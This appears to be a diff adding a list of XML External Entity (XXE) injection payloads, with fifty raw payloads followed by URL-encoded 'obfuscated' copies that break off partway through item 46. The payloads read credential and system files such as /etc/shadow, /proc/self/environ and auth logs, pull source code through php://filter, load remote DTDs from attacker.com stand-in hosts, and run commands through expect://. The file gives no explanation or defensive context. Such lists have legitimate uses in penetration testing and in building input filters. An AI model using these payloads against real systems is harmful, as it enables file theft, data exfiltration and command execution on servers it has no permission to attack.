@@ -1,0 +1,101 @@
+**Original Payloads**
+
+1.  `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <foo>&xxe;</foo>`
+2.  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]><foo>&xxe;</foo>`
+3.  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]><foo>&xxe;</foo>`
+4.  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/issue"> ]><foo>&xxe;</foo>`
+5.  `<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/version">]><doc>&xxe;</doc>`
+6.  `<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><doc>&xxe;</doc>`
+7.  `<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///dev/random"> ]> <text> &ent; </text>`
+8.  `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ext SYSTEM "file:///dev/urandom">]><root>&ext;</root>`
+9.  `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`
+10. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&file;</root>`
+11. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/log/apache2/access.log">]><root>&file;</root>`
+12. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe.xml">]><foo>&xxe;</foo>`
+13. `<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><doc>&xxe;</doc>`
+14. `<!DOCTYPE replace [<!ENTITY ent SYSTEM "ftp://attacker.com/file.txt"> ]> <text> &ent; </text>`
+15. `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ext SYSTEM "expect://ls -la">]><root>&ext;</root>`
+16. `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ext SYSTEM "expect://id">]><root>&ext;</root>`
+17. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>`
+18. `<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQh">]><doc>&xxe;</doc>`
+19. `<!DOCTYPE replace [<!ENTITY ent SYSTEM "data://text/plain;charset=utf-8,Hello%20World"> ]> <text> &ent; </text>`
+20. `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ext SYSTEM "data://text/plain,Hello%20Again!">]><root>&ext;</root>`
+21. `<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "https://attacker.com/xxe.xml">]><doc>&xxe;</doc>`
+22. `<!DOCTYPE replace [<!ENTITY ent SYSTEM "https://attacker.com/evil.dtd"> ]> <text> &ent; </text>`
+23. `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ext SYSTEM "jar:http://attacker.com/evil.jar!/evil.dtd">]><root>&ext;</root>`
+24. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">]><foo>&xxe;</foo>`
+25. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///var/log/apache2/error.log"> ]> <text> &xxe; </text>`
+26. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///usr/local/apache2/conf/httpd.conf">]><foo>&xxe;</foo>`
+27. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///opt/tomcat/conf/server.xml"> ]> <text> &xxe; </text>`
+28. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`
+29. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///c:/boot.ini"> ]> <text> &xxe; </text>`
+30. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/xampp/htdocs/index.php">]><foo>&xxe;</foo>`
+31. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///var/www/html/index.html"> ]> <text> &xxe; </text>`
+32. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///usr/share/nginx/html/index.html">]><foo>&xxe;</foo>`
+33. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///usr/lib/systemd/system.conf"> ]> <text> &xxe; </text>`
+34. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/os-release">]><foo>&xxe;</foo>`
+35. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/group"> ]> <text> &xxe; </text>`
+36. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/services">]><foo>&xxe;</foo>`
+37. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/timezone"> ]> <text> &xxe; </text>`
+38. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/spool/cron/crontabs/root">]><foo>&xxe;</foo>`
+39. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///var/log/syslog"> ]> <text> &xxe; </text>`
+40. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/auth.log">]><foo>&xxe;</foo>`
+41. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///var/log/messages"> ]> <text> &xxe; </text>`
+42. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/apache/logs/access.log">]><foo>&xxe;</foo>`
+43. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///opt/apache/logs/error.log"> ]> <text> &xxe; </text>`
+44. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/nginx/logs/access.log">]><foo>&xxe;</foo>`
+45. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///opt/nginx/logs/error.log"> ]> <text> &xxe; </text>`
+46. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/tomcat/logs/catalina.out">]><foo>&xxe;</foo>`
+47. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///opt/tomcat/logs/localhost_access_log.txt"> ]> <text> &xxe; </text>`
+48. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/cmdline">]><foo>&xxe;</foo>`
+49. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///proc/mounts"> ]> <text> &xxe; </text>`
+50. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/net/tcp">]><foo>&xxe;</foo>`
+
+**Obfuscated Payloads (URL-Encoded)**
+
+1.  `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%20%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+2.  `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fshadow%22%3E%20%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+3.  `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhosts%22%3E%20%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+4.  `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fissue%22%3E%20%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+5.  `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20doc%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fproc%2Fversion%22%3E%5D%3E%3Cdoc%3E%26xxe%3B%3C%2Fdoc%3E`
+6.  `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20doc%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fproc%2Fself%2Fenviron%22%3E%5D%3E%3Cdoc%3E%26xxe%3B%3C%2Fdoc%3E`
+7.  `%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20ent%20SYSTEM%20%22file%3A%2F%2F%2Fdev%2Frandom%22%3E%20%5D%3E%20%3Ctext%3E%20%26ent%3B%20%3C%2Ftext%3E`
+8.  `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20ext%20SYSTEM%20%22file%3A%2F%2F%2Fdev%2Furandom%22%3E%5D%3E%3Croot%3E%26ext%3B%3C%2Froot%3E`
+9.  `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+10. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20file%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dindex.php%22%3E%5D%3E%3Croot%3E%26file%3B%3C%2Froot%3E`
+11. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20file%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%2Fvar%2Flog%2Fapache2%2Faccess.log%22%3E%5D%3E%3Croot%3E%26file%3B%3C%2Froot%3E`
+12. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe.xml%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+13. `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20doc%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%5D%3E%3Cdoc%3E%26xxe%3B%3C%2Fdoc%3E`
+14. `%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20ent%20SYSTEM%20%22ftp%3A%2F%2Fattacker.com%2Ffile.txt%22%3E%20%5D%3E%20%3Ctext%3E%20%26ent%3B%20%3C%2Ftext%3E`
+15. `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20ext%20SYSTEM%20%22expect%3A%2F%2Fls%20-la%22%3E%5D%3E%3Croot%3E%26ext%3B%3C%2Froot%3E`
+16. `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20ext%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E%5D%3E%3Croot%3E%26ext%3B%3C%2Froot%3E`
+17. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fwhoami%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+18. `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20doc%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22data%3A%2F%2Ftext%2Fplain%3Bbase64%2CSGVsbG8gV29ybGQh%22%3E%5D%3E%3Cdoc%3E%26xxe%3B%3C%2Fdoc%3E`
+19. `%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20ent%20SYSTEM%20%22data%3A%2F%2Ftext%2Fplain%3Bcharset%3Dutf-8%2CHello%2520World%22%3E%20%5D%3E%20%3Ctext%3E%20%26ent%3B%20%3C%2Ftext%3E`
+20. `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20ext%20SYSTEM%20%22data%3A%2F%2Ftext%2Fplain%2CHello%2520Again%21%22%3E%5D%3E%3Croot%3E%26ext%3B%3C%2Froot%3E`
+21. `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20doc%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22https%3A%2F%2Fattacker.com%2Fxxe.xml%22%3E%5D%3E%3Cdoc%3E%26xxe%3B%3C%2Fdoc%3E`
+22. `%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20ent%20SYSTEM%20%22https%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E%20%5D%3E%20%3Ctext%3E%20%26ent%3B%20%3C%2Ftext%3E`
+23. `%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20ext%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2Fevil.dtd%22%3E%5D%3E%3Croot%3E%26ext%3B%3C%2Froot%3E`
+24. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+25. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fvar%2Flog%2Fapache2%2Ferror.log%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+26. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fusr%2Flocal%2Fapache2%2Fconf%2Fhttpd.conf%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+27. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fopt%2Ftomcat%2Fconf%2Fserver.xml%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+28. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+29. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fboot.ini%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+30. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2FC%3A%2Fxampp%2Fhtdocs%2Findex.php%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+31. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Findex.html%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+32. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fusr%2Fshare%2Fnginx%2Fhtml%2Findex.html%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+33. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fusr%2Flib%2Fsystemd%2Fsystem.conf%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+34. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fos-release%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+35. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fgroup%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+36. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fservices%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+37. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Ftimezone%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+38. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fvar%2Fspool%2Fcron%2Fcrontabs%2Froot%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+39. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fvar%2Flog%2Fsyslog%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+40. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fvar%2Flog%2Fauth.log%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+41. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fvar%2Flog%2Fmessages%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+42. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fopt%2Fapache%2Flogs%2Faccess.log%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+43. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fopt%2Fapache%2Flogs%2Ferror.log%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+44. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fopt%2Fnginx%2Flogs%2Faccess.log%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E`
+45. `%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20replace%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fopt%2Fnginx%2Flogs%2Ferror.log%22%3E%20%5D%3E%20%3Ctext%3E%20%26xxe%3B%20%3C%2Ftext%3E`
+46. `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fopt%2Ftomcat%2Flogs%2Fcatalina.out%22%3E%
